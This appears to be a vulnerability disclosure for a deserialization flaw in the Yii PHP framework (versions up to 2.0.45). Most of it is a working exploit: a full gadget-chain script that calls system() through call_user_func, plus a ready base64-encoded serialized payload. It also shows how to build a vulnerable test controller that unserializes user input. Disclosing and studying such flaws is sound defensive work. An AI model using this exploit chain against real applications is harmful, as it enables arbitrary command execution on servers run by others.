## Vulnerability description

Yii version <=2.0.45 has a deserialization vulnerability. If the framework is referenced and there is a deserialization entry point, an attacker can achieve arbitrary command execution through deserialization. 

The exploitation point is in the getIterator() method of symfony\finder\Iterator\SortableIterator.php.

## Affects Version

Yii <= 2.0.45

## vulnerability proof

yii2 v2.0.45 php v8.2.9

![](https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250317210909960.png)

When setting up the environment, remember to assign a value to cookieValidationKey in config/web.php, and then add a deserialization entry in the actionIndex() method of controllers\SiteController.php.

```php
public function actionIndex()  
{  
    $name = Yii::$app->request->get('input');  
    unserialize(base64_decode($name));  
    return $this->render('index');  
}
```

EXP

```php
<?php  
namespace Symfony\Component\Finder\Iterator {  
    class SortableIterator  
    {  
        public $iterator;  
        public $sort;  
  
        function __construct($iterator, $sort)  
        {  
            $this->iterator = $iterator;  
            $this->sort = $sort;  
        }  
    }  
}  
namespace Codeception{  
  
    class Example  
    {  
        public $data;  
  
        public function __construct($data)  
        {  
            $this->data = $data;  
        }  
    }  
}  
namespace SebastianBergmann\RecursionContext{  
    use Symfony\Component\Finder\Iterator\SortableIterator;  
    use Codeception\Example;  
    final class Context  
    {  
        public $arrays;  
    }  
    $a=new Context();  
    $b = new Example(['system','whoami']);  
    $a->arrays=new SortableIterator($b, "call_user_func");  
    echo base64_encode(serialize($a));  
}
```

After serialization

```
Tzo0MjoiU2ViYXN0aWFuQmVyZ21hbm5cUmVjdXJzaW9uQ29udGV4dFxDb250ZXh0IjoxOntzOjY6ImFycmF5cyI7Tzo1MDoiU3ltZm9ueVxDb21wb25lbnRcRmluZGVyXEl0ZXJhdG9yXFNvcnRhYmxlSXRlcmF0b3IiOjI6e3M6ODoiaXRlcmF0b3IiO086MTk6IkNvZGVjZXB0aW9uXEV4YW1wbGUiOjE6e3M6NDoiZGF0YSI7YToyOntpOjA7czo2OiJzeXN0ZW0iO2k6MTtzOjY6Indob2FtaSI7fX1zOjQ6InNvcnQiO3M6MTQ6ImNhbGxfdXNlcl9mdW5jIjt9fQ==
```

![](https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250317211819711.png)
